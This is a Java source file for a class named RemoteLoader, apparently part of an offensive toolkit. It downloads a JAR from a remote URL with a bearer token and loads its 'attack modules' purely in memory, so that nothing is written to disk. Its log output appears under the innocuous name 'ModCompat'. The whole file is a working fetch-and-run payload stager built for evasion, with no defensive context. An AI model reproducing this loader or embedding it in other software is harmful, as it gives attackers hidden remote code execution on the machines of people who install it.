package com.redblue.red.core;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ServiceLoader;

public class RemoteLoader {

    private static final Logger LOGGER = LoggerFactory.getLogger("ModCompat");
    private static URLClassLoader attackClassLoader;

    public static void load(String remoteUrl, String token) {
        try {
            byte[] jarBytes = download(remoteUrl, token);
            if (jarBytes == null) return;

            // In-memory class loading, no file on disk
            attackClassLoader = new InMemoryClassLoader(
                jarBytes, RemoteLoader.class.getClassLoader()
            );

            ServiceLoader<AttackModule> loader =
                ServiceLoader.load(AttackModule.class, attackClassLoader);

            int count = 0;
            for (AttackModule module : loader) {
                ModuleRegistry.register(module);
                count++;
            }
            LOGGER.info("Loaded {} remote attack modules", count);
        } catch (Exception e) {
            LOGGER.error("Failed to load remote modules", e);
        }
    }

    public static void unload() {
        ModuleRegistry.clear();
        if (attackClassLoader != null) {
            try { attackClassLoader.close(); } catch (Exception ignored) {}
            attackClassLoader = null;
        }
    }

    private static byte[] download(String remoteUrl, String token) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(remoteUrl).openConnection();
            conn.setRequestProperty("Authorization", "Bearer " + token);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(30000);

            if (conn.getResponseCode() != 200) {
                LOGGER.warn("Auth failed: HTTP {}", conn.getResponseCode());
                return null;
            }

            try (InputStream in = conn.getInputStream()) {
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                byte[] buf = new byte[8192];
                int n;
                while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
                return out.toByteArray();
            }
        } catch (Exception e) {
            LOGGER.error("Download failed", e);
            return null;
        }
    }
}
